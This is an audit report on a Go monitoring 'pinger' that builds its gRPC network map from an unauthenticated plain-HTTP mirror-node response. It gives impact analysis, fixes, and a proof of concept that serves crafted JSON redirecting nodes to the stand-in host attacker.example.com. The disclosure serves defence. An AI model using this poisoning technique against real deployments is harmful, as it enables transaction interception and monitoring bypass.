Audit Report

## Title
Unauthenticated HTTP Mirror-Node Response Allows Network-Map Poisoning via Injected `service_endpoints`

## Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` issues an unauthenticated HTTP GET to `cfg.mirrorRest` and unconditionally trusts the JSON response to construct the gRPC network map. An attacker who can control or intercept that HTTP response can inject arbitrary `service_endpoints`, causing the pinger to submit all transactions to attacker-controlled nodes.

## Finding Description

**Verified code path — `pinger/mirror_node_client.go`:**

The `httpClient` is constructed with no TLS configuration: [1](#0-0) 

The HTTP request is issued with no scheme enforcement — whatever URL is in `cfg.mirrorRest` is used verbatim: [2](#0-1) 

The only guard before decoding is an HTTP status-code range check: [3](#0-2) 

The network map is then built directly from the decoded response with no validation of host addresses or port numbers beyond non-empty/non-zero: [4](#0-3) 

**Critically, the documented example URL in `config.go` is explicitly `http://mirror-rest:5551`** — plain HTTP is the intended and documented deployment pattern, not an edge case: [5](#0-4) 

There is no:
- HTTPS/TLS enforcement on `cfg.mirrorRest`
- `Content-Type` header validation
- Response signature or HMAC verification
- Allowlist of permitted IP addresses, domain names, or port numbers

Go's `encoding/json` silently discards unknown fields while faithfully deserializing recognized ones (`nodes[].service_endpoints`), so a crafted response with extra fields passes decoding without error.

**This only affects `network=other`**, confirmed by `sdk_client.go`: [6](#0-5) 

## Impact Explanation

The pinger's entire gRPC node set is replaced with attacker-controlled endpoints. Consequences:

- **Monitoring bypass:** Attacker nodes return fake success responses; the pinger reports healthy while the real network is not being probed.
- **Transaction interception:** The attacker observes all submitted transactions, including timing, amounts, and operator account patterns.
- **Denial of service:** Returning unreachable endpoints causes all pinger transactions to fail silently, defeating the health-check purpose.

## Likelihood Explanation

- The documented example URL (`http://mirror-rest:5551`) makes plain HTTP the expected deployment pattern, not a misconfiguration.
- `network=other` is the mode for custom/private deployments — exactly where a self-hosted, potentially less-hardened mirror node is used.
- Any on-path network attacker (same LAN, rogue router, cloud VPC peer) can MITM a plaintext HTTP connection without credentials.
- DNS hijacking of the mirror node hostname requires no privileged access to the pinger deployment itself.
- The attack is a one-shot: `buildNetworkFromMirrorNodes` is called once at startup; a single poisoned response is sufficient.

## Recommendation

1. **Enforce HTTPS**: Reject any `cfg.mirrorRest` URL whose scheme is not `https`. Add a validation step in `loadConfig()` when `cfg.network == "other"`.
2. **TLS verification**: Use the default `http.Transport` (which verifies TLS certificates) and do not disable `InsecureSkipVerify`.
3. **Endpoint allowlisting**: Optionally, validate decoded `host`/`port` values against a configurable allowlist of expected IP ranges or domain suffixes before inserting into the network map.
4. **Update documentation**: Change the example in `config.go` from `http://mirror-rest:5551` to `https://mirror-rest:443` to prevent operators from inadvertently deploying with plaintext HTTP.

## Proof of Concept

```bash
# 1. Stand up a rogue HTTP server returning a crafted nodes response
cat > fake_nodes.json << 'EOF'
{
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{
      "domain_name": "attacker.example.com",
      "ip_address_v4": "",
      "port": 50211
    }]
  }],
  "links": {"next": null}
}
EOF
python3 -m http.server 5551 &   # serves fake_nodes.json at /api/v1/network/nodes

# 2. Launch pinger pointing at the rogue mirror node
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://127.0.0.1:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
./pinger

# Result: hiero.ClientForNetwork() is built with {"attacker.example.com:50211": "0.0.3"}
# All subsequent gRPC transactions are submitted to attacker.example.com:50211
```

The JSON decode at line 96 returns `nil` error; `len(network) == 1` passes the guard at line 127; the poisoned map is returned to `newClient()` and passed directly to `hiero.ClientForNetwork()`. [7](#0-6)
